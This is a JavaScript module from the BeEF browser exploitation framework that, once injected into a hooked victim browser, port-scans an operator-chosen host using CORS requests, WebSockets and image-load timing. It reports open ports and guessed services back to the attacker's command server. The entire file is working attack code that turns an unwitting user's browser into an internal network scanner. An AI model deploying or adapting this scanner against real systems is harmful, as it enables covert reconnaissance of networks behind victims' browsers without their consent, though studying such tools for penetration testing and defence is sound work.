//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


beef.execute(function() {

	var blocked_ports = [ 1, 7, 9, 11, 13, 15, 17, 19, 20, 21, 22, 23, 25, 37, 42, 43, 53, 77, 79, 87, 95, 101, 102, 103, 104, 109, 110, 111, 113, 115, 117, 119, 123, 135, 139, 143, 179, 389, 465, 512, 513, 514, 515, 526, 530, 531, 532, 540, 556, 563, 587, 601, 636, 993, 995, 2049, 3659, 4045, 6000, 6665, 6666, 6667, 6668, 6669, 65535 ];
	
	var default_ports = [ 1,5,7,9,15,20,21,22,23,25,26,29,33,37,42,43,53,67,68,69,70,76,79,80,88,90,98,101,106,109,110,111,113,114,115,118,119,123,129,132,133,135,136,137,138,139,143,144,156,158,161,162,168,174,177,194,197,209,213,217,219,220,223,264,315,316,346,353,389,413,414,415,416,440,443,444,445,453,454,456,457,458,462,464,465,466,480,486,497,500,501,516,518,522,523,524,525,526,533,535,538,540,541,542,543,544,545,546,547,556,557,560,561,563,564,625,626,636,637,660,664,666,683,740,741,742,744,747,748,749,750,751,752,753,754,758,760,761,762,763,764,765,767,771,773,774,775,776,780,781,782,783,786,787,799,800,801,808,871,873,888,898,901,953,989,990,992,993,994,995,996,997,998,999,1000,1002,1008,1023,1024,1080,8080,8443,8050,3306,5432,1521,1433,3389,10088 ];

	var default_services = { '1':'tcpmux','5':'rje','7':'echo','9':'msn','15':'netstat','20':'ftp-data','21':'ftp','22':'ssh','23':'telnet','25':'smtp','26':'rsftp','29':'msgicp','33':'dsp','37':'time','42':'nameserver','43':'whois','53':'dns','67':'dhcps','68':'dhcpc','69':'tftp','70':'gopher','76':'deos','79':'finger','80':'http','88':'kerberos-sec','90':'dnsix','98':'linuxconf','101':'hostname','106':'pop3pw','109':'pop2','110':'pop3','111':'rpcbind','113':'auth','114':'audionews','115':'sftp','118':'sqlserv','119':'nntp','123':'ntp','129':'pwdgen','132':'cisco-sys','133':'statsrv','135':'msrpc','136':'profile','137':'netbios-ns','138':'netbios-dgm','139':'netbios-ssn','143':'imap','144':'news','156':'sqlserv','158':'pcmail-srv','161':'snmp','162':'snmptrap','168':'rsvd','174':'mailq','177':'xdmcp','194':'irc','197':'dls','209':'tam','213':'ipx','217':'dbase','219':'uarps','220':'imap3','223':'cdc','264':'bgmp','315':'dpsi','316':'decauth','346':'zserv','353':'ndsauth','389':'ldap','413':'smsp','414':'infoseek','415':'bnet','416':'silverplatter','440':'sgcp','443':'https','444':'snpp','445':'microsoft-ds','453':'creativeserver','454':'contentserver','456':'macon','457':'scohelp','458':'appleqtc','462':'datasurfsrvsec','464':'kpasswd5','465':'smtps','466':'digital-vrc','480':'loadsrv','486':'sstats','497':'retrospect','500':'isakmp','501':'stmf','516':'videotex','518':'ntalk','522':'ulp','523':'ibm-db2','524':'ncp','525':'timed','526':'tempo','533':'netwall','535':'iiop','538':'gdomap','540':'uucp','541':'uucp-rlogin','542':'commerce','543':'klogin','544':'kshell','545':'ekshell','546':'dhcpconf','547':'dhcpserv','556':'remotefs','557':'openvms-sysipc','560':'rmonitor','561':'monitor','563':'snews','564':'9pfs','625':'apple-xsrvr-admin','626':'apple-imap-admin','636':'ldapssl','637':'lanserver','660':'mac-srvr-admin','664':'secure-aux-bus','666':'doom','683':'corba-iiop','740':'netcp','741':'netgw','742':'netrcs','744':'flexlm','747':'fujitsu-dev','748':'ris-cm','749':'kerberos-adm','750':'kerberos','751':'kerberos_master','752':'qrh','753':'rrh','754':'krb_prop','758':'nlogin','760':'krbupdate','761':'kpasswd','762':'quotad','763':'cycleserv','764':'omserv','765':'webster','767':'phonebook','771':'rtip','773':'submit','774':'rpasswd','775':'entomb','776':'wpages','780':'wpgs','781':'hp-collector','782':'hp-managed-node','783':'spamassassin','786':'concert','787':'qsc','799':'controlit','800':'mdbs_daemon','801':'device','808':'ccproxy-http','871':'supfilesrv','873':'rsync','888':'accessbuilder','898':'sun-manageconsole','901':'samba-swat','953':'rndc','989':'ftps-data','990':'ftps','992':'telnets','993':'imaps','994':'ircs','995':'pop3s','996':'xtreelic','997':'maitrd','998':'busboy','999':'garcon','1000':'cadlock','1002':'windows-icfw','1008':'ufsd','1023':'netvenuechat','1024':'kdm','1080':'socks','8080':'tomcat','8443':'tomcat','8050':'coldfusion','3306':'mysql','5432':'postgres','1521 ':'oracle','1433':'mssql','3389':'msrdp','10088':'zendserver' };
	
	var host = '<%= @ipHost %>';
	// TODO: Adjust times for each browser
	var closetimeout = '<%= @closetimeout %>';
	var opentimeout = '<%= @opentimeout %>';
	var delay = '<%= @delay %>';
	var ports = '<%= @ports %>';
    	var debug = '<%= @debug %>';
	var protocol = 'ftp://';

	var start_time_ws = undefined;
	var start_time_cors = undefined;
	var start_time_http = undefined;
	var start_scan = undefined;
	var intID_http = undefined;
	var intID_ws = undefined;
	var intID_cors = undefined;

	var port = "";
	var ports_list= [];

	var timeval = parseInt(opentimeout) + parseInt(delay*2);
	var port_status_http = 0;
	var port_status_ws = 0;
	var port_status_cors = 0;
	// 0 : unknown
	// 1 : closed
	// 2 : open
	// 3 : timeout
	// 4 : blocked
	var process_port_http = false;
	var process_port_ws = false;
	var process_port_cors = false;
	var count = 0;

	var img_scan = undefined;
	var ws_scan = undefined;
	var cs_scan = undefined;
	var s = undefined;

	var debug_value = false; // It will show what status is the port for each method
    	if (debug == 'true')
	{
       		debug_value = true;
    	}

	function check_blocked(port_to_check)
	{
		var res = false;

		for (var i=0; i<blocked_ports.length; i++)
		{
			if (port_to_check == blocked_ports[i])
			{
				res = true;
			}
		}
	
		return res;
	}

	function prepare_ports()
	{
		if (ports == 'default') // Default ports to scan
		{
			// nmap most used ports to scan + some new ports
			for ( var i=0; i<default_ports.length; i++)
			{
				ports_list[i] = default_ports[i];
			}

		} else 
		{ // Custom ports provided to scan
			if (ports.search(",") > 0) ports_list = ports.split(","); // list of ports
			else if (ports.search("-") > 0) 
			{
				var firstport = parseInt(ports.split("-")[0]); // range of ports, start
				var lastport = parseInt(ports.split("-")[1]); // range of ports, end
				var a = 0;
				for (var i = firstport; i<=lastport; i++)
				{
					ports_list[a] = firstport + a;
					a++;
				}
			} else ports_list = ports.split(); // single port
		}
	}

	function cors_scan(hostname, port_)
	{
		if (check_blocked(parseInt(port_)))
		{
			process_port_cors = true;
			port_status_cors = 4; // blocked
			if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=CORS: Port ' + port_ + ' is BLOCKED');}
			return;
		}

		//var interval = (new Date).getTime() - start_time_cors;

		cs_scan = new XMLHttpRequest();

            	cs_scan.open('GET', "http://" + hostname + ":" + port_, true);
            	cs_scan.send(null);

		intID_cors = setInterval(
		function ()
		{
			var interval = (new Date).getTime() - start_time_cors;
			if (process_port_cors) 
			{
				return;
			}

			if (cs_scan.readyState === 1) // CONNECTING
			{
			}

			if (cs_scan.readyState === 2) // OPEN
			{
			}

			if (cs_scan.readyState === 3) // CLOSING
			{
			}
	
			if (cs_scan.readyState === 4) // CLOSE
			{
				clearInterval(intID_cors);
				process_port_cors = true;
				if (interval < closetimeout)
				{
					port_status_cors =  1; // closed
					if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=CORS: Port ' + port_ + ' is CLOSED');}
				} else 
				{
					port_status_cors = 2; // open
					var known_service = "";
					if (port_ in default_services) 
					{
						known_service = "(" + default_services[port_] + ")";
					}
					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=CORS: Port ' + port_ + ' is OPEN ' + known_service);
				}
			}

			if (interval >= opentimeout)
			{
				clearInterval(intID_cors);
				process_port_cors = true;
				port_status_cors = 3; // timeout
				if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=CORS: Port ' + port_ + ' is TIMEOUT');}
			}	
			return;	
		}
		, 1);
	}

	function websocket_scan(hostname, port_)
	{
		if (check_blocked(parseInt(port_)))
		{
			process_port_ws = true;
			port_status_ws = 4; // blocked
			if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=WebSocket: Port ' + port_ + ' is BLOCKED');}
			return;
		}

		if ("WebSocket" in window)
		{
			ws_scan = new WebSocket("ws://" + hostname + ":" + port_);
		}
		if ("MozWebSocket" in window)
		{
			ws_scan = new MozWebSocket("ws://" + hostname + ":" + port_);
		}

		//var interval = (new Date).getTime() - start_time_ws;

		intID_ws = setInterval(
		function ()
		{
			var interval = (new Date).getTime() - start_time_ws;

			if (process_port_ws) 
			{
				clearInterval(intID_ws);
				return;
			}

			if (ws_scan.readyState === 0) // CONNECTING
			{
			}

			if (ws_scan.readyState === 1) // OPEN
			{
				// TODO: Detect WebSockets server running
			}

			if (ws_scan.readyState === 2) // CLOSING
			{
			}
	
			if (ws_scan.readyState === 3) // CLOSE
			{
				clearInterval(intID_ws);
				process_port_ws = true;
				if (interval < closetimeout)
				{
					port_status_ws =  1; // closed
					if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=WebSocket: Port ' + port_ + ' is CLOSED');}
				} else 
				{
					port_status_ws = 2; // open
					var known_service = "";
					if (port_ in default_services) 
					{
						known_service = "(" + default_services[port_] + ")";
					}
					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=WebSocket: Port ' + port_ + ' is OPEN ' + known_service);
				}
				ws_scan.close();
			}

			if (interval >= opentimeout)
			{
				clearInterval(intID_ws);
				process_port_ws = true;
				port_status_ws = 3; // timeout
				if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=WebSocket: Port ' + port_ + ' is TIMEOUT');}
				ws_scan.close();		
			}	
			return;	
		}
		, 1);
	}

	function http_scan(protocol_, hostname, port_)
	{
		//process_port_http = false;

		img_scan = new Image();

		img_scan.onerror = function(evt) 
		{
			var interval = (new Date).getTime() - start_time_http;
		
			if (interval < closetimeout)
			{
				if (process_port_http == false)
				{
					port_status_http = 1; // closed
					if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=HTTP: Port ' + port_ + ' is CLOSED');}
					clearInterval(intID_http);
				}
				process_port_http = true;
			}
		};

		img_scan.onload = img_scan.onerror;

		img_scan.src = protocol_ + hostname + ":" + port_;
		
		intID_http = setInterval(
		function ()
		{
			var interval = (new Date).getTime() - start_time_http;
	
			if (interval >= opentimeout)
			{
				if (!img_scan) return;
				//img_scan.src = "";
				img_scan = undefined;

				if (process_port_http == false)
				{
					port_status_http = 2; // open
					process_port_http = true;
				}
				clearInterval(intID_http);
				var known_service = "";
				if (port_ in default_services) 
				{
					known_service = "(" + default_services[port_] + ")";
				}
				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=HTTP: Port ' + port_ + ' is OPEN ' + known_service);
			}
		}
		, 1);
	}

	prepare_ports();

	if (ports_list.length < 1)
	{
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=Scan aborted, no valid ports provided to scan');
		return;
	} else 
	{
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=Scanning: ' + ports_list);
	}
	
	count = 0;
	start_scan = (new Date).getTime();

	s =  setInterval(
	
	function() 
	{
		if(count < ports_list.length)
		{
			start_time_cors = (new Date).getTime();
			cors_scan(host, ports_list[count]);
			start_time_ws = (new Date).getTime();
			websocket_scan(host, ports_list[count]);
			start_time_http = (new Date).getTime();
			http_scan(protocol, host, ports_list[count]);
    		}
		
    		count++;
		port_status_http = 0; // unknown
		process_port_http = false;
		port_status_ws = 0; // unknown
		process_port_ws = false;
		port_status_cors = 0; // unknown
		process_port_cors = false;

    		if(count >= ports_list.length) 
		{ 
			clearInterval(s);
			var interval = (new Date).getTime() - start_scan;
			setTimeout(function() { beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Scan Finished in ' + interval + ' ms'); }, opentimeout*2);
		}
	}
	,timeval);

});

